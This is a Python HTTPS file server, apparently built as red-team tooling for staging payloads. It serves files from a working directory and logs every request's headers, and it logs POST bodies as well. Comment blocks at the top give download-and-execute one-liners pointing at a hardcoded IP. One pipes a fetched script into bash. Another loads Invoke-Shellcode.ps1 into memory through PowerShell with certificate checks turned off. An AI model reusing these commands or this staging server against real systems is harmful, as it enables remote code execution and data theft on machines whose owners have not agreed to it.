# -*- coding: utf-8 -*-
# @Time    : 2021-08-25
# @Author  : aplyc1a
# @FileName: MyHTTPServer.py

# openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes

# Linux
'''
curl https://170.170.13.87:8443/1.sh -k -s|bash
wget https://170.170.13.87:8443/1.sh --no-check-certificate
'''

# Windows
'''
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
iex(New-Object Net.WebClient).DownloadString('https://170.170.13.87:8443/Invoke-Shellcode.ps1')

(New-Object Net.WebClient).DownloadFile('https://170.170.13.87:8443/1.zip','c:\1.zip')
'''

import ssl, http.server
import optparse
import cgi
import pprint
import datetime
import os

log_file = "./log90f6a6359a2a3471022cbba/access.log"
WORK_SPACE = "./html"
class MyHTTPSServer(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path[-1] == '/':
            self.path = '/00000000000000000000404.html'
        # 192.168.44.1 - - [07/Aug/2021 08:31:33] "GET /favicon.ico HTTP/1.1" 404 -
        
        with open(log_file, 'a+', encoding='UTF-8') as f:
            timenow = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            f.write("------------------------------------------------\n")
            content = "%s - - [%s] \"%s %s HTTP/1.1\" ??? -" %(self.address_string(), timenow, self.command, self.path)
            f.write(content+"\n")
            f.write(str(self.headers))
            f.close()
        return http.server.SimpleHTTPRequestHandler.do_GET(self)

    def do_POST(self):
        if self.path[-1] == '/':
            self.path = '/00000000000000000000404.html'
        req_datas = self.rfile.read(int(self.headers['content-length']))
        with open(log_file, 'a+', encoding='UTF-8') as f:
            timenow = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            f.write("------------------------------------------------\n")
            content = "%s - - [%s] \"%s %s HTTP/1.1\" ??? -" %(self.address_string(), timenow, self.command, self.path)
            f.write(content+"\n")
            f.write(str(self.headers))
            f.write(req_datas.decode())
            f.close()
        print(content)
        return
        
def show_banner():
    content = "===================================================================================\n  __  __       _    _ _______ _______ _____   _____ _____                          \n |  \\/  |     | |  | |__   __|__   __|  __ \\ / ____/ ____|                         \n | \\  / |_   _| |__| |  | |     | |  | |__) | (___| (___   ___  _ _ __   _____ _ __ \n | |\\/| | | | |  __  |  | |     | |  |  ___/ \\___ \\\\___ \\ / _ \\| '/ \\ \\ / / _ \\ '__|\n | |  | | |_| | |  | |  | |     | |  | |     ____) |___) |  __/| |   \\ V /  __/ |   \n |_|  |_|\\__, |_|  |_|  |_|     |_|  |_|    |_____/_____/ \\___ |_|    \\_/ \\___|_|   \n          __/ |                                                     @aplyc1a       \n         |___/                                                                     \n===================================================================================\n"
    with open(log_file, 'a+', encoding='UTF-8') as f:
        f.write(content)
        print(content)
        f.close()

def main():
    parser = optparse.OptionParser('python httpsserver.py -p 8443 ' )
    parser.add_option('-p', '--port', dest = 'port', type = 'string', help = 'set port of https service.')
    (options,args) = parser.parse_args()
    port=options.port

    httpd = http.server.HTTPServer(('0.0.0.0', int(port)), MyHTTPSServer)
    httpd.socket = ssl.wrap_socket(httpd.socket, certfile='server.pem', server_side=True)
    os.chdir("./html")
    show_banner()
    httpd.serve_forever()

if __name__ == '__main__':
    
    main()
